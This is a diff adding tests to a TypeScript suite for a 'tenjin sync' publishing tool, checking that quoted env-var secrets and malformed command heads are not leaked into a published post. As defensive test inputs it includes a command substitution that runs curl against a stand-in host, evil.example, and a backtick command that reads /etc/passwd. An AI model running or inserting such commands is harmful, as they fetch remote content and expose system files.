@@ -333,6 +333,100 @@ describe('tenjin sync: publishing an unsynced code-scoped pairing', () => {
   });
 
   /**
+   * PR 277 round-2 review, new-in-delta finding: `fixCmdHead` skipped past a
+   * `NAME=value` assignment word without noticing a quoted value had been
+   * split on whitespace, so the SECOND word of the quoted value became the
+   * published head — leaking a fragment of an operator secret even though the
+   * env var's own name (`MYSQL_PWD`, `SSH_PASSPHRASE`, `GIT_AUTHOR_NAME`)
+   * misses `SECRET_ASSIGN_RE` and so is never scrubbed at capture time. An
+   * unbalanced quote in the skipped word now bails the whole line rather than
+   * guessing at the next word.
+   */
+  it.each([
+    ['MYSQL_PWD="correct horse battery staple" pnpm test', 'horse'],
+    ['SSH_PASSPHRASE="open sesame now" pnpm build', 'sesame'],
+    ['GIT_AUTHOR_NAME="Jane Doe" pnpm test', 'Doe"'],
+  ])(
+    'drops the Passed on: line rather than leaking a quoted env value word: %s',
+    async (fixCmd, leaked) => {
+      await writeTeamConfig();
+      await seedPairing({
+        cwd: dir,
+        key: 'fine-hash-quoted-env',
+        coarseKey: 'coarse-hash-quoted-env',
+        fixCmd,
+        status: 'unverified',
+      });
+      const { provider } = spyProvider();
+      const { fetch, sent } = shelfServer();
+
+      await runSync(ctx(), { cwd: dir, provider, fetchImpl: fetch });
+
+      expect(sent).toHaveLength(1);
+      const bodyMd = sent[0]!.body!.bodyMd as string;
+      expect(bodyMd).not.toContain('Passed on:');
+      expect(bodyMd).not.toContain(leaked);
+    },
+  );
+
+  /**
+   * PR 277 round-2 review, nits under the same new function: an unguarded
+   * head shape let a command substitution, a backtick, a redirect target, or
+   * a runaway-length token straight through to the published body.
+   * `CMD_HEAD_SHAPE_RE` rejects anything that does not look like a plain
+   * command/basename.
+   */
+  it.each([
+    ['$(curl https://evil.example/x) pnpm test', '$(curl'],
+    ['`cat /etc/passwd` pnpm test', '`cat'],
+    ['>out.log 2>&1', '>out.log'],
+    ['a'.repeat(400), 'a'.repeat(400)],
+  ])(
+    'drops the Passed on: line for a head that does not look like a command: %s',
+    async (fixCmd, leaked) => {
+      await writeTeamConfig();
+      await seedPairing({
+        cwd: dir,
+        key: 'fine-hash-bad-shape',
+        coarseKey: 'coarse-hash-bad-shape',
+        fixCmd,
+        status: 'unverified',
+      });
+      const { provider } = spyProvider();
+      const { fetch, sent } = shelfServer();
+
+      await runSync(ctx(), { cwd: dir, provider, fetchImpl: fetch });
+
+      expect(sent).toHaveLength(1);
+      const bodyMd = sent[0]!.body!.bodyMd as string;
+      expect(bodyMd).not.toContain('Passed on:');
+      expect(bodyMd).not.toContain(leaked);
+    },
+  );
+
+  /** A normal unquoted env-style assignment ahead of the real command still
+   *  yields the plain command head — the quote and shape checks above must
+   *  not over-fire on the common case. */
+  it('still yields the command head past a normal unquoted env assignment', async () => {
+    await writeTeamConfig();
+    await seedPairing({
+      cwd: dir,
+      key: 'fine-hash-plain-env',
+      coarseKey: 'coarse-hash-plain-env',
+      fixCmd: 'FOO=bar pnpm test',
+      status: 'unverified',
+    });
+    const { provider } = spyProvider();
+    const { fetch, sent } = shelfServer();
+
+    await runSync(ctx(), { cwd: dir, provider, fetchImpl: fetch });
+
+    expect(sent).toHaveLength(1);
+    const bodyMd = sent[0]!.body!.bodyMd as string;
+    expect(bodyMd).toContain('Passed on: pnpm');
+  });
+
+  /**
    * tenjin-agent#252: `publishPost`'s own response names the read URL, title
    * and price of the post this machine just created, and `setLink` now stashes
    * them on the `pairing_post:<n>` link — which is what lets `inspect
